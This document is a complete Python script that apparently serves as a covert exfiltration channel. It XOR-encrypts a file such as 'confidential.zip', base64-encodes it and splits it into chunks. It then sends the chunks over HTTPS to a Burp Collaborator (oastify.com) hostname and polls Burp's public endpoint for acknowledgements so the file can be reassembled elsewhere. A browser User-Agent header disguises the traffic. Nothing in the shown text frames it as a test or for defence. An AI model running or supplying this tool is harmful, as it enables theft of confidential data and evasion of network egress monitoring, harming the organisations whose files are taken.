from base64 import b64decode, b64encode
from getpass import getpass
from json import loads
from time import sleep
from requests import get, post
from sys import argv



HEADERS = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36',
    'Accept-Encoding': 'gzip, deflate',
    'Accept': '*/*',
    'Accept-Language': 'en'
}
RNRN = b'\x0d\x0a\x0d\x0a'
SECONDS = 0.5



def decode(chunk):

    print('[+] Decoding ...')

    i = 1
    b64 = ''

    for chunkId in sorted(chunk):
        if i != chunkId:
            print(f'[!] Wrong position for chunk {i}!')
        b64 += chunk[chunkId]
        i += 1

    return b64decode(b64)



def decrypt(data, key):

    print('[+] Decrypting ...')

    return xor(data, key)



def download(filename, hostname, biid, key):

    print(f'[+] Downloading {filename} ...')

    chunk = {}
    lastChunk = False

    while True:
        print('Polling ...')

        content = fetch(biid)

        if content:
            for e in content['responses']:
                if e['protocol'] == 'https':
                    client = e['client']
                    time = e['time']

                    requestToBC = b64decode(e['data']['request'])
                    pos = requestToBC.find(RNRN) + 4

                    body = loads(requestToBC[pos:])

                    chunk[int(body['chunkId'])] = body['payload']

                    print(f'{body["chunkId"]} - [{client}] - {time} - https - {len(body["payload"])} bytes')

                    lastChunk = int(body['lastChunk']) == 1

                    send(hostname, {'ack': body['chunkId']})

            if lastChunk:
                break

        sleep(SECONDS)

    if chunk:
        data = decode(chunk)
        data = decrypt(data, key)
        saveToDisk(filename, data)



def encode(bytes):

    print('[+] Encoding ...')

    return b64encode(bytes)



def encrypt(data, key):

    print('[+] Encrypting ...')

    return xor(data, key)



def fetch(biid):

    urlToReceive = 'https://polling.oastify.com/burpresults'
    parametersToReceive = {'biid': biid}
    r = get(urlToReceive, headers = HEADERS, params = parametersToReceive)
    return loads(r.text)



def saveToDisk(filename, data):

    print(f'[+] Saving to disk ...')

    open(filename, 'wb').write(data)



def send(hostname, bodyToSend):

    post(f'https://{hostname}', headers = HEADERS, json = bodyToSend)



def upload(filename, hostname, biid, key):

    bytes = open(filename, 'rb').read()

    bytes = encrypt(bytes, key)

    b64 = encode(bytes)
    b64l = len(b64)

    print(f'[+] Uploading {filename} ...')

    chunkSize = 7500

    urlToSend = f'https://{hostname}'

    chunkId = 1

    for i in range(0, b64l, chunkSize):
        size = b64l - i
        lastChunk = 1
        if size > chunkSize:
            size = chunkSize
            lastChunk = 0

        bodyToSend = {
            'chunkId': chunkId,
            'lastChunk': lastChunk,
            'payload': b64[i:i + chunkSize]
        }

        received = False

        while not received:
            print(f'{chunkId} - {size} bytes')

            send(hostname, bodyToSend)
            maxRetries = 30

            while maxRetries:
                content = fetch(biid)
                maxRetries -= 1

                if content:
                    for e in content['responses']:
                        if e['protocol'] == 'https':
                            requestToBC = b64decode(e['data']['request'])
                            pos = requestToBC.find(RNRN) + 4

                            body = loads(requestToBC[pos:])

                            ack = int(body['ack'])

                            if chunkId == ack:
                                received = True
                                maxRetries = 0
                                break
                sleep(SECONDS)

        chunkId += 1



def xor(data, key):

    data = bytearray(data)
    lk = len(key)

    key = key.encode()

    for i in range(len(data)):
        data[i] = data[i] ^ key[i % lk]

    return bytes(data)



# Required arguments
action = argv[1] # download | upload
hostname = argv[2] # hostname.oastify.com
biid = argv[3] # biid=
filename = argv[4] # confidential.zip

if len(argv) == 6:
    key = argv[5] # 1234qwer
else:
    key = getpass('Enter Key: ')



if action == 'download':
    download(filename, hostname, biid, key)
elif action == 'upload':
    upload(filename, hostname, biid, key)
